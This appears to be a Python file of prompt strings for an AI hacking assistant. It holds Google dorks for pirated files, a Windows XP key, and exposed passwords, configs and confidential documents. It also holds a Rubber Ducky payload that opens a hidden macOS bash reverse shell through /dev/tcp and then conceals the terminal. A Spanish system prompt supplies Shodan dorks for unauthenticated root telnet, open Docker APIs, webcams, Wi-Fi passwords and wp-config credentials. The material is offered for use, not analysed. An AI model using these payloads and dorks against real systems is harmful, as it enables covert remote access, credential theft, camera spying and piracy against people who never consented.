google_prompt = """
ext:git = Search for a concret extension

Nina Simone intitle:”index.of” “parent directory” “size” “last modified” “description” I Put A Spell On You (mp4|mp3|avi|flac|aac|ape|ogg) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics-realm|mp3-collection) -site:.info
Bill Gates intitle:”index.of” “parent directory” “size” “last modified” “description” Microsoft (pdf|txt|epub|doc|docx) -inurl:(jsp|php|html|aspx|htm|cf|shtml|ebooks|ebook) -site:.info
parent directory /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
filetype:config inurl:web.config inurl:ftp
“Windows XP Professional” 94FBR
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:”budget approved”) inurl:confidential
ext:inc "pwd=" "UID="
ext:ini intext:env.ini
ext:ini Version=... password
ext:ini Version=4.0.0.4 password
ext:ini eudora.ini
ext:ini intext:env.ini
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log "Software: Microsoft Internet Information
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log \"Software: Microsoft Internet Information Services *.*\"
ext:mdb   inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
filetype:SWF SWF
filetype:TXT TXT
filetype:XLS XLS
filetype:asp   DBQ=" * Server.MapPath("*.mdb")


intext:"Index of" /"chat/logs"
intext:"Index of /network" "last modified"
intext:"Index of /" +.htaccess
intext:"Index of /" +passwd
intext:"Index of /" +password.txt
intext:"Index of /admin"
intext:"Index of /backup"
intext:"Index of /mail"  
"""
rubberducky_prompt = """

REM Reverse shell macos

DELAY 1000 #Hay que esperar a que el usb se cargue 
GUI SPACE # Combinación de teclas para abrir spotlight
DELAY 100 # Esperamos
STRING terminal # Nos metemos en la terminal
DELAY 100 # Esperamos
ENTER
DELAY 300
STRING bash # Nos aseguramos de que la shell es bash
DELAY 300
ENTER
STRING bash -i >& /dev/tcp/127.0.0.1/56342 0>&1 # Reverse shell
ENTER
DELAY 200
STRING clear # Limpiamos
ENTER
DELAY 200
GUI m # Ocultamos la terminal
DELAY 300
GUI m

STRING
The STRING command keystroke injects (types) a series of keystrokes. STRING will automatically interpret uppercase letters by holding the SHIFT modifier key where necessary. The STRING command will also automatically press the SPACE cursor key, however trailing spaces will be omitted.
Copy
STRING The quick brown fox jumps over the lazy dog
STRINGLN
The STRINGLN command, like STRING, will inject a series of keystrokes then terminate with a carriage return (ENTER).
Copy
STRINGLN      _      _      _      USB       _      _      _
STRINGLN   __(.)< __(.)> __(.)=   Rubber   >(.)__ <(.)__ =(.)__
STRINGLN   \___)  \___)  \___)    Ducky!    (___/  (___/  (___/
STRING Blocks
STRING Blocks
STRING blocks can be used effectively to convert multiple lines into one without needing to prepend each line with STRING
STRING blocks strip leading white space and ignore new lines!
Copy
STRING
    a
    b
    c
END_STRING
is the equivalent of 
Copy
STRING a
STRING b
STRING c
Or in this case: STRING abc
 STRINGLN Blocks
STRINGLN blocks can be used like here-doc; allowing you to inject multiple lines as they are written in the payload. 
STRINGLN blocks strip the first tab but will preserve all other formatting
Copy
STRINGLN
    a
    b
    c
END_STRINGLN
is the equivalent of
Copy
STRINGLN a
STRINGLN b
STRINGLN c
Result
Deploying this payload will produce the following keystroke injection on the target machine:
Copy
a
b
c
Cursor Keys
The cursor keys are used to navigate the cursor to a different position on the screen.
UP DOWN LEFT RIGHT
UPARROW DOWNARROW LEFTARROW RIGHTARROW
PAGEUP PAGEDOWN HOME END
INSERT DELETE DEL BACKSPACE
TAB
SPACE
System Keys 
System keys are primarily used by the operating system for special functions and may be used to interact with both text areas and navigating the user interface.
ENTER
ESCAPE
PAUSE BREAK
PRINTSCREEN
MENU APP
F1 F2 F3 F4 F5 F6 F7 F8 F9 F0 F11 F12
Basic Modifier Keys
Modifier keys held in combination with another key to perform a special function. Common keyboard combinations for the PC include the familiar CTRL c for copy, CTRL x for cut, and CTRL v for paste. 
SHIFT
ALT
CONTROL or CTRL
COMMAND
WINDOWS or GUI
Copy
REM Windows Modifier Key Example

REM Open the RUN Dialog
GUI r

REM Close the window
ALT F4
Key and Modifier Combos
In addition to the basic modifier key combinations, such as CTRL c, modifiers and keys may be combined arbitrarily.
CTRL SHIFT
ALT SHIFT
COMMAND CTRL
COMMAND CTRL SHIFT
COMMAND OPTION
COMMAND OPTION SHIFT
CONTROL ALT DELETE
Copy
CTRL ALT DELETE
Standalone Modifier Keys
Injecting a modifier key alone without another key — such as pressing the WINDOWS key — may be achieved by prepending the modifier key with the INJECT_MOD command.
Copy
REM Example pressing Windows key alone

INJECT_MOD WINDOWS
Lock Keys
Lock keys toggle the lock state (on or off) and typically change the interpretation of subsequent keypresses. For example, caps lock generally makes all subsequent letter keys appear in uppercase.
CAPSLOCK
NUMLOCK
SCROLLOCK


"""
Shodan_Context_Beta = """
Eres un asistente de ciberseguridad cuya unica función es procesar la petición del usuario para generar una dork de shodan lo mas exacta posible
Aquí unas dorks de ejemplo 
        city:
Find devices in a particular city. city:"Bangalore"
country:
Find devices in a particular country. country:"IN"
geo:
Find devices by giving geographical coordinates. geo:"56.913055,118.250862"
Location
country:us country:ru country:de city:chicago

hostname:

Find devices matching the hostname. server: "gws" hostname:"google" hostname:example.com -hostname:subdomain.example.com hostname:example.com,example.org

net:

Find devices based on an IP address or /x CIDR. net:210.214.0.0/16

Organization

org:microsoft org:"United States Department"

Autonomous System Number (ASN)

asn:ASxxxx

os:

Find devices based on operating system. os:"windows 7"

port:

Find devices based on open ports. proftpd port:21

before/after:

Find devices before or after between a given time. apache after:22/02/2009 before:14/3/2010

SSL/TLS Certificates

Self signed certificates ssl.cert.issuer.cn:example.com ssl.cert.subject.cn:example.com

Expired certificates ssl.cert.expired:true

ssl.cert.subject.cn:example.com

Device Type

device:firewall device:router device:wap device:webcam device:media device:"broadband router" device:pbx device:printer device:switch device:storage device:specialized device:phone device:"voip" device:"voip phone" device:"voip adaptor" device:"load balancer" device:"print server" device:terminal device:remote device:telecom device:power device:proxy device:pda device:bridge

Operating System

os:"windows 7" os:"windows server 2012" os:"linux 3.x"

Product

product:apache product:nginx product:android product:chromecast

Customer Premises Equipment (CPE)

cpe:apple cpe:microsoft cpe:nginx cpe:cisco

Server

server: nginx server: apache server: microsoft server: cisco-ios

ssh fingerprints

dc:14:de:8e:d7:c1:15:43:23:82:25:81:d2:59:e8:c0

Web

Pulse Secure


Metasploit

ssl:"MetasploitSelfSignedCA"

Network Infrastructure

Hacked routers:

Routers which got compromised hacked-router-help-sos

Redis open instances

product:"Redis key-value store"

Citrix:

Find Citrix Gateway. title:"citrix gateway"

Weave Scope Dashboards

Command-line access inside Kubernetes pods and Docker containers, and real-time visualization/monitoring of the entire infrastructure.

title:"Weave Scope" http.favicon.hash:567176827

Jenkins CI

"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"

Jenkins:

Jenkins Unrestricted Dashboard x-jenkins 200

Docker APIs

"Docker Containers:" port:2375

Docker Private Registries

"Docker-Distribution-Api-Version: registry" "200 OK" -gitlab

Pi-hole Open DNS Servers

"dnsmasq-pi-hole" "Recursion: enabled"

DNS Servers with recursion

"port: 53" Recursion: Enabled

Already Logged-In as root via Telnet

"root@" port:23 -login -password -name -Session

Telnet Access:

NO password required for telnet access. port:23 console gateway

Polycom video-conference system no-auth shell

"polycom command shell"

NPort serial-to-eth / MoCA devices without password

nport -keyin port:23

Android Root Bridges

A tangential result of Google's sloppy fractured update approach. 🙄 More information here.

"Android Debug Bridge" "Device" port:5555

Lantronix Serial-to-Ethernet Adapter Leaking Telnet Passwords

Lantronix password port:30718 -secured

Citrix Virtual Apps

"Citrix Applications:" port:1604

Cisco Smart Install

Vulnerable (kind of "by design," but especially when exposed).

"smart install client active"

PBX IP Phone Gateways

PBX "gateway console" -password port:23

Polycom Video Conferencing

http.title:"- Polycom" "Server: lighttpd" "Polycom Command Shell" -failed port:23

Telnet Configuration:

"Polycom Command Shell" -failed port:23

Example: Polycom Video Conferencing

Bomgar Help Desk Portal

"Server: Bomgar" "200 OK"

Intel Active Management CVE-2017-5689

"Intel(R) Active Management Technology" port:623,664,16992,16993,16994,16995 ”Active Management Technology”

HP iLO 4 CVE-2017-12542

HP-ILO-4 !"HP-ILO-4/2.53" !"HP-ILO-4/2.54" !"HP-ILO-4/2.55" !"HP-ILO-4/2.60" !"HP-ILO-4/2.61" !"HP-ILO-4/2.62" !"HP-iLO-4/2.70" port:1900

Lantronix ethernet adapter’s admin interface without password

"Press Enter for Setup Mode port:9999"

Wifi Passwords:

Helps to find the cleartext wifi passwords in Shodan. html:"def_wirelesspassword"

Misconfigured Wordpress Sites:

The wp-config.php if accessed can give out the database credentials. http.html:"* The wp-config.php creation script uses this file"

Outlook Web Access:

Exchange 2007

"x-owa-version" "IE=EmulateIE7" "Server: Microsoft-IIS/7.0"

Exchange 2010

"x-owa-version" "IE=EmulateIE7" http.favicon.hash:442749392

Exchange 2013 / 2016

"X-AspNet-Version" http.title:"Outlook" -"x-owa-version"

Lync / Skype for Business

"X-MS-Server-Fqdn"

Network Attached Storage (NAS)

SMB (Samba) File Shares

Produces ~500,000 results...narrow down by adding "Documents" or "Videos", etc.

"Authentication: disabled" port:445

Specifically domain controllers:

"Authentication: disabled" NETLOGON SYSVOL -unix port:445

Concerning default network shares of QuickBooks files:

"Authentication: disabled" "Shared this folder to access QuickBooks files OverNetwork" -unix port:445

FTP Servers with Anonymous Login

"220" "230 Login successful." port:21

Iomega / LenovoEMC NAS Drives

"Set-Cookie: iomega=" -"manage/login.html" -http.title:"Log In"

Buffalo TeraStation NAS Drives

Redirecting sencha port:9000

Logitech Media Servers

"Server: Logitech Media Server" "200 OK"

Example: Logitech Media Servers

Plex Media Servers

"X-Plex-Protocol" "200 OK" port:32400

Tautulli / PlexPy Dashboards

"CherryPy/5.1.0" "/home"

Home router attached USB

"IPC$ all storage devices"

Webcams

Generic camera search

title:camera

Webcams with screenshots

webcam has_screenshot:true

D-Link webcams

"d-Link Internet Camera, 200 OK"

Hipcam

"Hipcam RealServer/V1.0"

Yawcams

"Server: yawcam" "Mime-Type: text/html"

webcamXP/webcam7

("webcam 7" OR "webcamXP") http.component:"mootools" -401

Android IP Webcam Server

"Server: IP Webcam Server" "200 OK"

Security DVRs

html:"DVR_H264 ActiveX"

Surveillance Cams:

With username:admin and password: :P NETSurveillance uc-httpd Server: uc-httpd 1.0.0

Printers & Copiers:

HP Printers

"Serial Number:" "Built:" "Server: HP HTTP"

Xerox Copiers/Printers

ssl:"Xerox Generic Root"

Epson Printers

"SERVER: EPSON_Linux UPnP" "200 OK"

"Server: EPSON-HTTP" "200 OK"

Canon Printers

"Server: KS_HTTP" "200 OK"

"Server: CANON HTTP Server"

Home Devices

Yamaha Stereos

"Server: AV_Receiver" "HTTP/1.1 406"

Apple AirPlay Receivers

Apple TVs, HomePods, etc.

"\x08_airplay" port:5353

Chromecasts / Smart TVs

"Chromecast:" port:8008

Crestron Smart Home Controllers

"Model: PYNG-HUB"

Random Stuff

Calibre libraries

"Server: calibre" http.status:200 http.title:calibre

OctoPrint 3D Printer Controllers

title:"OctoPrint" -title:"Login" http.favicon.hash:1307375944

Etherium Miners

"ETH - Total speed"

Apache Directory Listings

Substitute .pem with any extension or a filename like phpinfo.php.

http.title:"Index of /" http.html:".pem"

Misconfigured WordPress

Exposed wp-config.php files containing database credentials.

http.html:"* The wp-config.php creation script uses this file"

Too Many Minecraft Servers

"Minecraft Server" "protocol 340" port:25565

Literally Everything in North Korea

net:175.45.176.0/22,210.52.109.0/24,77.94.35.0/24

        
"""